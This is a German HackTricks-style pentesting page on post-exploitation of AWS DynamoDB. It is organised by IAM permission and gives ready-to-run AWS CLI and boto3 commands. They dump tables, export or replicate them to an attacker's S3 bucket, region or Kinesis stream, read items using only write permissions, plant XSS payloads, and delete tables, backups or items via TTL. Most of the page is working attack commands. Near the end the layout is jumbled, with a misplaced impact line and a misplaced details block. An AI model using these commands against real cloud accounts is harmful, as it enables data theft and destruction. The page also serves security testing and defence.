# AWS - DynamoDB Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## DynamoDB

Für weitere Informationen siehe:

{{#ref}}
../../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

Ein Angreifer mit dieser Berechtigung kann **Einträge aus Tabellen über den Primärschlüssel abrufen** (man kann nicht einfach alle Daten der Tabelle anfordern). Das bedeutet, dass du die Primärschlüssel kennen musst (du kannst sie erhalten, indem du die Tabellen-Metadaten abfragst (`describe-table`).

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potentielle Auswirkung:** Indirekter privesc durch das Auffinden sensibler Informationen in der Tabelle

### `dynamodb:GetItem`

**Ähnlich wie bei den vorherigen Berechtigungen** erlaubt diese dem potenziellen Angreifer, Werte aus nur 1 Tabelle zu lesen, vorausgesetzt, er kennt den Primärschlüssel des Eintrags, den er abrufen möchte:
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
Mit dieser Berechtigung ist es außerdem möglich, die Methode **`transact-get-items`** wie folgt zu verwenden:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Potential Impact:** Indirect privesc durch das Auffinden sensibler Informationen in der Tabelle

### `dynamodb:Query`

**Ähnlich wie bei den vorherigen Berechtigungen** erlaubt diese einem potenziellen Angreifer, Werte aus nur einer Tabelle zu lesen, sofern der Primärschlüssel des abzurufenden Eintrags vorliegt. Es erlaubt die Verwendung eines [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html), aber der einzige mit dem Primärschlüssel (der vorhanden sein muss) erlaubte Vergleich ist "EQ", daher kann man mit einem Vergleich nicht die gesamte Datenbank in einer Anfrage abrufen.

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** Indirekte privesc durch das Auffinden sensibler Informationen in der Tabelle

### `dynamodb:Scan`

Mit dieser Berechtigung können Sie **dump the entire table easily**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Potentielle Auswirkungen:** Indirektes privesc durch Auffinden sensibler Informationen in der Tabelle

### `dynamodb:PartiQLSelect`

Du kannst diese Berechtigung verwenden, um **die gesamte Tabelle einfach zu dumpen**.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
Diese Berechtigung erlaubt außerdem das Ausführen von `batch-execute-statement`, z. B.:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
Man muss jedoch den Primärschlüssel mit einem Wert angeben, daher ist es nicht sehr nützlich.

**Potential Impact:** Indirektes privesc durch das Auffinden sensibler Informationen in der Tabelle

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Diese Berechtigung erlaubt einem Angreifer, **die gesamte Tabelle in einen S3-Bucket seiner Wahl zu exportieren:**
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Beachte, dass dafür die Tabelle point-in-time-recovery aktiviert sein muss; du kannst prüfen, ob die Tabelle aktiviert ist mit:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
Wenn es nicht aktiviert ist, müssen Sie es **aktivieren** und dafür benötigen Sie die **`dynamodb:ExportTableToPointInTime`** Berechtigung:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potenzielle Auswirkung:** Indirect privesc durch Auffinden sensibler Informationen in der Tabelle

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)` 

Mit diesen Berechtigungen könnte ein Angreifer **eine neue Tabelle aus einem Backup erstellen** (oder sogar ein Backup erstellen, um es dann in einer anderen Tabelle wiederherzustellen). Anschließend könnte er mit den notwendigen Berechtigungen **Informationen** aus den Backups prüfen, die **nicht mehr in der Produktions-Tabelle** vorhanden sind.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Potentielle Auswirkung:** Indirekter privesc durch Auffinden sensibler Informationen im Tabellen-Backup

### `dynamodb:PutItem`

Diese Berechtigung erlaubt Benutzern, ein **neues Item zur Tabelle hinzuzufügen oder ein bestehendes Item durch ein neues zu ersetzen**. Falls bereits ein Item mit demselben Primärschlüssel existiert, wird das **gesamte Item durch das neue Item ersetzt**. Falls der Primärschlüssel nicht existiert, wird ein neues Item mit dem angegebenen Primärschlüssel **erstellt**.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** Ausnutzung weiterer Schwachstellen/Bypässe durch die Möglichkeit, Daten in einer DynamoDB-Tabelle hinzuzufügen/zu ändern

### `dynamodb:UpdateItem`

Diese Berechtigung erlaubt Benutzern, **die bestehenden Attribute eines Items zu ändern oder einem Item neue Attribute hinzuzufügen**. Sie ersetzt das gesamte Item **nicht**; sie aktualisiert nur die angegebenen Attribute. Wenn der Primärschlüssel nicht in der Tabelle existiert, wird die Operation ein **neues Item erstellen** mit dem angegebenen Primärschlüssel und die in der Update-Expression festgelegten Attribute setzen.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Mögliche Auswirkungen:** Ausnutzung weiterer Schwachstellen/bypasses durch das Hinzufügen/Ändern von Daten in einer DynamoDB-Tabelle

### `dynamodb:DeleteTable`

Ein Angreifer mit dieser Berechtigung kann **eine DynamoDB-Tabelle löschen, was zu Datenverlust führt**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Mögliche Auswirkungen**: Datenverlust und Unterbrechung von Diensten, die von der gelöschten Tabelle abhängen.

### `dynamodb:DeleteBackup`

Ein Angreifer mit dieser Berechtigung kann **ein DynamoDB-Backup löschen und dadurch möglicherweise Datenverlust verursachen, z. B. im Rahmen eines Disaster-Recovery-Szenarios**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Potentielle Auswirkungen**: Datenverlust und Unfähigkeit, im Rahmen eines Disaster-Recovery-Szenarios aus einem Backup wiederherzustellen.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: Testen, ob das tatsächlich funktioniert

Ein Angreifer mit diesen Berechtigungen kann **einen Stream auf einer DynamoDB-Tabelle aktivieren, die Tabelle aktualisieren, damit Änderungen gestreamt werden, und anschließend auf den Stream zugreifen, um Änderungen an der Tabelle in Echtzeit zu überwachen**. Dadurch kann der Angreifer Änderungen überwachen und Datenänderungen exfiltrate, was potenziell zu data leakage führen kann.

1. Einen Stream auf einer DynamoDB-Tabelle aktivieren:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. Beschreibe den Stream, um die ARN und andere Details zu erhalten:
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. Hole den Shard-Iterator mithilfe der Stream-ARN:
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. Verwende den shard iterator to access and exfiltrate data from the stream:
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potentielle Auswirkung**: Echtzeitüberwachung und Datenleak der Änderungen an der DynamoDB-Tabelle.

### Einträge lesen über `dynamodb:UpdateItem` und `ReturnValues=ALL_OLD`

Ein Angreifer, der nur `dynamodb:UpdateItem` auf einer Tabelle hat, kann Einträge lesen, ohne die üblichen Lese-Berechtigungen (`GetItem`/`Query`/`Scan`) zu besitzen, indem er ein harmloses Update durchführt und `--return-values ALL_OLD` anfordert. DynamoDB gibt das vollständige Pre-Update-Abbild des Eintrags im Feld `Attributes` der Antwort zurück (dies verbraucht keine RCUs).

- Minimale Berechtigungen: `dynamodb:UpdateItem` auf der Ziel-Tabelle/Schlüssel.
- Voraussetzungen: Sie müssen den Primärschlüssel des Eintrags kennen.

Beispiel (fügt ein harmloses Attribut hinzu und exfiltrates das vorherige Item in der Antwort):
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
Die CLI-Antwort enthält einen `Attributes`-Block, der das vollständige vorherige Item (alle Attribute) enthält und somit effektiv eine Lese-Primitive bei nur Schreibzugriff bereitstellt.

**Potential Impact:** Beliebige Items aus einer Tabelle lesen, obwohl nur Schreibberechtigungen vorhanden sind, wodurch die Exfiltration sensibler Daten ermöglicht wird, sofern die Primärschlüssel bekannt sind.


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

Stealth-Exfiltration durch das Hinzufügen einer neuen Replica-Region zu einer DynamoDB Global Table (version 2019.11.21). Wenn ein principal eine regionale Replica hinzufügen kann, wird die gesamte Tabelle in die vom Angreifer gewählte Region repliziert, von der aus der Angreifer alle Items lesen kann.

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

Berechtigungen: `dynamodb:UpdateTable` (mit `replica-updates`) oder `dynamodb:CreateTableReplica` auf der Zieltabelle. Falls CMK in der Replica verwendet wird, können KMS-Berechtigungen für diesen Schlüssel erforderlich sein.

Potentielle Auswirkung: Vollständige Tabellenreplikation in eine vom Angreifer kontrollierte Region, die zu stealthy data exfiltration führt.

### `dynamodb:TransactWriteItems` (lesen über fehlgeschlagene Bedingung + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

Ein Angreifer mit transaktionalen Schreibberechtigungen kann die vollständigen Attribute eines bestehenden Items exfiltrate, indem er ein `Update` innerhalb von `TransactWriteItems` durchführt, das absichtlich eine `ConditionExpression` fehlschlagen lässt, während `ReturnValuesOnConditionCheckFailure=ALL_OLD` gesetzt ist. Bei einem Fehlschlag fügt DynamoDB die vorherigen Attribute in die Gründe für die Stornierung der Transaktion ein und verwandelt so effektiv einen reinen Schreibzugriff in Lesezugriff auf die gezielten Schlüssel.

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

Berechtigungen: `dynamodb:TransactWriteItems` auf der Ziel-Tabelle (und dem zugrunde liegenden item). Es sind keine Lese-Berechtigungen erforderlich.

Mögliche Auswirkung: Beliebige items (per Primary Key) aus einer Tabelle lesen, indem nur transactionale Schreibberechtigungen über die zurückgegebenen cancellation reasons benutzt werden.


### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` auf GSI

Um Lesebeschränkungen zu umgehen, erstellen Sie einen Global Secondary Index (GSI) mit `ProjectionType=ALL` auf einem Attribut mit geringer Entropie, setzen dieses Attribut bei allen items auf einen konstanten Wert und führen dann eine `Query` auf dem Index aus, um die vollständigen items abzurufen. Das funktioniert selbst, wenn `Query`/`Scan` auf der Basistabelle verweigert wird, solange Sie die Index-ARN abfragen können.

- Mindestberechtigungen:
- `dynamodb:UpdateTable` auf der Ziel-Tabelle (um den GSI mit `ProjectionType=ALL` zu erstellen).
- `dynamodb:UpdateItem` auf den Schlüsselwerten der Ziel-Tabelle (um das indexierte Attribut bei jedem item zu setzen).
- `dynamodb:Query` auf der Index-Ressourcen-ARN (`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`).

Schritte (PoC in us-east-1):
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**Potentielle Auswirkungen:** Vollständige Tabellen-Exfiltration durch Abfragen eines neu erstellten GSI, der alle Attribute projiziert, selbst wenn Lese-APIs der Basistabelle verweigert werden.


### `dynamodb:EnableKinesisStreamingDestination` (Kontinuierliche Exfiltration über Kinesis Data Streams)

Missbrauch von DynamoDB Kinesis streaming destinations, um Änderungen aus einer Tabelle kontinuierlich in einen vom Angreifer kontrollierten Kinesis Data Stream zu exfiltrieren. Nach Aktivierung wird jedes INSERT/MODIFY/REMOVE-Ereignis nahezu in Echtzeit an den Stream weitergeleitet, ohne dass Lese-Berechtigungen für die Tabelle erforderlich sind.

Minimale Berechtigungen (Angreifer):
- `dynamodb:EnableKinesisStreamingDestination` für die Zieltabelle
- Optional `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable`, um den Status zu überwachen
- Lese-Berechtigungen auf dem vom Angreifer verwalteten Kinesis-Stream, um Records zu konsumieren: `kinesis:*`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
### `dynamodb:UpdateTimeToLive`

Ein Angreifer mit der dynamodb:UpdateTimeToLive-Berechtigung kann die TTL (time-to-live)-Konfiguration einer Tabelle ändern — TTL aktivieren oder deaktivieren. Wenn TTL aktiviert ist, werden einzelne items, die das konfigurierte TTL-Attribut enthalten, automatisch gelöscht, sobald ihre Ablaufzeit erreicht ist. Der TTL-Wert ist nur ein weiteres Attribut jedes items; items ohne dieses Attribut sind von TTL-basierten Löschungen nicht betroffen.

Wenn items nicht bereits das TTL-Attribut enthalten, benötigt der Angreifer außerdem eine Berechtigung zum Aktualisieren von items (z. B. dynamodb:UpdateItem), um das TTL-Attribut hinzuzufügen und Massenlöschungen auszulösen.

Aktivieren Sie zuerst TTL für die Tabelle und geben Sie den Attributnamen an, der für das Ablaufdatum verwendet werden soll:
```bash
aws dynamodb update-time-to-live \
--table-name <TABLE_NAME> \
--time-to-live-specification "Enabled=true, AttributeName=<TTL_ATTRIBUTE_NAME>"
```
Dann aktualisieren Sie die Items, um das TTL-Attribut (Epoch-Sekunden) hinzuzufügen, damit sie ablaufen und entfernt werden:
```bash
aws dynamodb update-item \
--table-name <TABLE_NAME> \
--key '<PRIMARY_KEY_JSON>' \
--update-expression "SET <TTL_ATTRIBUTE_NAME> = :t" \
--expression-attribute-values '{":t":{"N":"<EPOCH_SECONDS_VALUE>"}}'
```
### `dynamodb:RestoreTableFromAwsBackup` & `dynamodb:RestoreTableToPointInTime`

Ein Angreifer mit den Berechtigungen dynamodb:RestoreTableFromAwsBackup oder dynamodb:RestoreTableToPointInTime kann neue Tabellen erstellen, die aus Backups oder aus Point-in-Time Recovery (PITR) wiederhergestellt wurden, ohne die ursprüngliche Tabelle zu überschreiben. Die wiederhergestellte Tabelle enthält ein vollständiges Abbild der Daten zum gewählten Zeitpunkt, sodass der Angreifer sie verwenden kann, um historische Informationen zu exfiltrate oder einen kompletten Dump des früheren Zustands der Datenbank zu erhalten.

Wiederherstellen einer DynamoDB-Tabelle aus einem On-Demand-Backup:
```bash
aws dynamodb restore-table-from-backup \
--target-table-name <NEW_TABLE_NAME> \
--backup-arn <BACKUP_ARN>
```
Stelle eine DynamoDB-Tabelle zu einem bestimmten Zeitpunkt wieder her (erstelle eine neue Tabelle mit dem wiederhergestellten Zustand):
```bash
aws dynamodb restore-table-to-point-in-time \
--source-table-name <SOURCE_TABLE_NAME> \
--target-table-name <NEW_TABLE_NAME> \
--use-latest-restorable-time
````
</details>

**Potential Impact:** Kontinuierliche, nahezu in Echtzeit exfiltration von Tabellenänderungen an einen vom Angreifer kontrollierten Kinesis-Stream ohne direkte Leseoperationen auf der Tabelle.

{{#include ../../../../banners/hacktricks-training.md}}
